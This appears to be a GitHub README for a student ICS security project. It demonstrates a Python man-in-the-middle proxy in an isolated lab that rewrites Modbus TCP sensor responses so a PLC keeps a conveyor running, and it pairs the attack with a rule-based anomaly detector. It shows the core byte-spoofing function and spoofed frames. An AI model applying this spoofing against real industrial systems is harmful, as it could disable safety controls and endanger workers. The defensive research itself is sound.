# Modbus TCP MITM — ICS Security Research

**Vaibhav** · BTech Automation & Robotics (2026) · ICS/OT Security Research

![Python](https://img.shields.io/badge/Python-3.x-3776AB?style=flat-square&logo=python&logoColor=white)
![Kali Linux](https://img.shields.io/badge/Kali_Linux-2026.1-557C94?style=flat-square&logo=kalilinux&logoColor=white)
![Protocol](https://img.shields.io/badge/Modbus_TCP-Port_503-E85D04?style=flat-square)
![Domain](https://img.shields.io/badge/ICS%2FOT_Security-Research-2D6A4F?style=flat-square)
![CVSS](https://img.shields.io/badge/CVSS_v3.1-9.1_Critical-CC0000?style=flat-square)
![Lab](https://img.shields.io/badge/Environment-Isolated_Lab-6C757D?style=flat-square)

---

> A Python-based Modbus TCP man-in-the-middle proxy that intercepts, parses, and modifies PLC sensor communications in a controlled ICS/OT testbed — demonstrating the real-world consequences of unauthenticated industrial protocols and building a working anomaly detector as a countermeasure.

> **Scope:** All testing conducted in an isolated lab environment. No production or third-party systems were targeted or affected.

---

## Table of contents

1. [Why this matters](#why-this-matters)
2. [Lab architecture](#lab-architecture)
3. [Protocol deep dive — FC=2](#protocol-deep-dive--fc2-read-discrete-inputs)
4. [How the proxy works](#how-the-proxy-works)
5. [Anomaly detection](#anomaly-detection--defensepy)
6. [Impact analysis](#impact-analysis)
7. [Mitigations](#mitigations)
8. [Key takeaways](#key-takeaways)
9. [Repository structure](#repository-structure)
10. [References](#references)

---

## Why this matters

Modbus TCP is the dominant communication protocol in global industrial automation. It runs inside water treatment plants, power substations, manufacturing lines, and oil refineries. It was designed in **1979** for physically isolated serial networks where security was irrelevant — physical access was the only access.

When Modbus was adapted to TCP/IP in 1999, **no security layer was added.** The protocol still has zero native authentication, zero encryption, and zero integrity verification. Yet it now runs on open IP networks, sometimes reachable from corporate IT, cloud infrastructure, or the public internet.

This project makes that concrete. Not as a theoretical claim — as a working proof-of-concept in a controlled lab.

| Security feature | TCP/IP standard | Modbus TCP | Consequence |
|---|---|---|---|
| Authentication | TLS certificates | **None** | Any host can impersonate any device |
| Encryption | TLS 1.3 | **None** | All traffic is readable in plaintext |
| Integrity | HMAC/MAC | **None** | Packets can be silently modified mid-transit |
| Session binding | TLS sessions | **None** | No per-session token or handshake |
| Access control | Firewall/ACL | **None** (protocol-level) | No per-command authorization |
| Audit trail | Syslog/SIEM | **None** (protocol-level) | Attacks leave no trace in PLC logs |

---

## Lab architecture

```
┌─────────────────────┐        ┌────────────────────────┐        ┌──────────────────────┐
│   OpenPLC Runtime   │        │    Kali Linux VM        │        │     Factory I/O      │
│   (Docker)          │─TCP──► │    MITM Proxy           │─TCP──► │     (Windows)        │
│                     │  :503  │                         │  :503  │                      │
│   PLC Master        │        │  1. Accepts OpenPLC     │        │   Modbus TCP server  │
│   Reads FC=2 sensor │        │  2. Relays to Factory   │        │   Beam sensor sim.   │
│   Controls conveyor │        │  3. Intercepts response │        │   192.168.0.196:503  │
└─────────────────────┘        │  4. Modifies Byte[9]    │        └──────────────────────┘
          ▲                    │  5. Forwards to PLC     │
          │                    └────────────────────────┘
          │                               │
          │        Spoofed: sensor = 0xFF (unbroken beam)
          └───────────────────────────────┘
          PLC receives falsified data — conveyor runs even when beam is blocked
```

| Component | Tool / Version | Role |
|---|---|---|
| ICS simulation | Factory I/O v2.5 | Modbus server + physical conveyor simulation |
| PLC runtime | OpenPLC v4 (Docker) | PLC master — reads sensors, drives actuators |
| PLC logic | OpenPLC Editor | Ladder logic programming environment |
| Attacker machine | Kali Linux 2026.1 (VMware) | MITM proxy host, packet analysis |
| Traffic analysis | Wireshark, tcpdump | Frame capture and byte-level inspection |
| Scripting | Python 3 stdlib | Socket relay, packet parsing, byte manipulation |

---

## Protocol deep dive — FC=2 Read Discrete Inputs

Function Code 2 is how a PLC reads digital sensor states from field devices. In this lab, OpenPLC polls the beam sensor in Factory I/O via FC=2 every ~15ms.

### Modbus TCP frame structure

```
┌──────────┬──────────┬──────────┬─────────┬───────────────┬──────────────────────────┐
│ Byte 0-1 │ Byte 2-3 │ Byte 4-5 │ Byte 6  │    Byte 7     │         Byte 8-9         │
├──────────┼──────────┼──────────┼─────────┼───────────────┼──────────────────────────┤
│  Tx ID   │ Proto ID │  Length  │ Unit ID │ Function Code │    Data payload          │
│          │ (0x0000) │          │         │ 0x02 = FC=2   │ [8]=byte count [9]=value │
└──────────┴──────────┴──────────┴─────────┴───────────────┴──────────────────────────┘
```

### Before and after spoofing

```
Legitimate FC=2 response  (Factory I/O → OpenPLC):
  00 01  00 00  00 04  01  02  01  00
                                  ^^
                            Byte[9] = 0x00 → beam blocked → conveyor STOPS

Spoofed FC=2 response  (Kali proxy → OpenPLC):
  00 01  00 00  00 04  01  02  01  FF
                                  ^^
                            Byte[9] = 0xFF → beam "clear" → conveyor RUNS
```

The PLC cannot distinguish these two packets. No signature, no session token, no application-layer checksum. TCP's own integrity check covers only transmission errors — not adversarial modification.

The spoofed value `0xFF` is a protocol violation: valid Modbus discrete input responses are `0x00` or `0x01` only. This is detectable by anomaly monitoring — which is exactly what `defense.py` catches.

---

## How the proxy works

The proxy sits transparently between OpenPLC and Factory I/O. All traffic in both directions is relayed — but FC=2 responses on the return path are intercepted and modified.

### Execution flow

```
OpenPLC sends FC=2 request
        │
        ▼
Proxy receives → forwards to Factory I/O unchanged
        │
        ▼
Factory I/O sends FC=2 response  (Byte[9] = 0x00 or 0x01)
        │
        ▼
Proxy intercepts → modify_response() rewrites Byte[9] to 0xFF
        │
        ▼
Spoofed packet forwarded to OpenPLC
        │
        ▼
PLC acts on falsified sensor state — conveyor continues running
```

### Core logic (annotated)

```python
def modify_response(data: bytes) -> bytes:
    """
    Modbus TCP FC=2 response — sensor value is at Byte[9].

    Valid discrete input values:
      0x00 = beam blocked (box present)
      0x01 = beam clear  (no box)

    Spoofed value:
      0xFF = non-standard; forces PLC to treat sensor as always clear.
             Also detectable by anomaly monitoring (see defense.py Rule 1).
    """
    if len(data) < 10:
        return data                    # Too short to be a valid FC=2 frame

    if data[7] == 2:                   # Function Code = Read Discrete Inputs
        modified = bytearray(data)
        modified[9] = 0xFF             # Overwrite sensor byte
        return bytes(modified)

    return data                        # Pass all other function codes unmodified
```

The proxy runs two threads per connection — one relaying OpenPLC → Factory I/O (unmodified), one relaying Factory I/O → OpenPLC (intercepted). Both directions stay live, so the connection appears normal from both ends.

---

## Anomaly detection — `defense.py`

`defense.py` is a monitoring proxy that listens on port 503 and applies three heuristic rules to every FC=2 response packet. After 3 consecutive alerts, it escalates to a MITM confirmation event and logs the source IP.

### Rule 1 — Invalid byte value

Valid discrete input responses are `0x00` or `0x01` only. Anything else is a protocol violation.

```python
if sensor_byte not in [0x00, 0x01]:
    alert(f"Abnormal sensor byte: 0x{sensor_byte:02X} — expected 0x00 or 0x01")
```

**Catches:** the `0xFF` spoofing variant used in this lab.

### Rule 2 — Rapid state transitions

A physical beam sensor changes state when a box passes. More than 3 transitions in a 4-reading window is physically implausible for this conveyor.

```python
transitions = sum(1 for i in range(1, len(window)) if window[i] != window[i-1])
if transitions >= 3:
    alert(f"Rapid sensor transitions — pattern: {list(window)}")
```

**Catches:** replay-style attacks or injected noise patterns.

### Rule 3 — Sensor permanently at 1

A real beam sensor in a conveyor loop will read `0` when a box is present. Eight consecutive `1` readings means the sensor has never detected a box — physically implausible under normal operation.

```python
if len(window) >= 8 and all(v == 1 for v in window):
    alert("Sensor stuck at 1 for 8+ readings — possible value forcing")
```

**Catches:** persistent spoofing that locks the sensor in a fixed clear state.

### Limitations

Rule-based detection has a hard ceiling. These rules catch *this* attack variant — not all spoofing:

- Rule 1 only catches out-of-spec values. An attacker sending `0x01` continuously bypasses it entirely.
- Rules 2 and 3 are calibrated for this specific conveyor. A different process would need different thresholds.
- No cryptographic validation. The detector cannot prove a packet actually originated from the legitimate Factory I/O device.
- A well-informed attacker who knows the thresholds can stay under them.

This is why detection alone is insufficient. Network-layer controls — allowlisting, protocol-aware firewalls, and eventually ModbusTLS — provide guarantees that heuristics cannot.

---

## Impact analysis

| Scenario | Severity | Detail |
|---|---|---|
| Safety system bypass | **Critical** | Falsified sensors can disable emergency stops; in real plants, direct worker safety risk |
| Process sabotage | High | Production disrupted without physical access or malware |
| Equipment damage | High | Actuators driven beyond safe parameters when sensor feedback is falsified |
| Covert persistence | High | PLC and Modbus logs record what the PLC *received* — the spoofed value, not the real one |
| Data integrity | **Critical** | All sensor records during the attack period are corrupted; audit trails are unreliable |

### CVSS v3.1 score — 9.1 (Critical)

| Metric | Value | Rationale |
|---|---|---|
| Attack vector | Network | No physical access required |
| Attack complexity | Low | Repeatable, no special conditions |
| Privileges required | None | Modbus has no authentication layer |
| User interaction | None | Fully automated |
| Scope | Changed | Affects PLC safety logic beyond the network component |
| Confidentiality | None | No data exfiltration |
| Integrity | High | Sensor data fully and silently falsifiable |
| Availability | High | Industrial process can be disrupted or halted |

> The CVSS score reflects the specific lab scenario demonstrated — not Modbus TCP in all configurations. Network architecture, firewall rules, and monitoring controls affect real-world exploitability.

---

---


## References

- [Modbus Application Protocol Specification v1.1b3](https://modbus.org/docs/Modbus_Application_Protocol_V1_1b3.pdf)
- [CISA ICS Security Guidelines](https://www.cisa.gov/ics)
- [NIST SP 800-82r3 — Guide to Operational Technology Security](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-82r3.pdf)
- [IEC 62443 — Industrial Automation and Control Systems Security](https://www.iec.ch/iecnow/iec-now-details/iecnow-article-details/article/getting-started-with-iec-62443/)
- [Dragos ICS/OT Cybersecurity Year in Review](https://www.dragos.com/resource/ics-ot-cybersecurity-year-in-review/)

---

*Conducted in an isolated lab environment. No production systems were targeted or affected.*
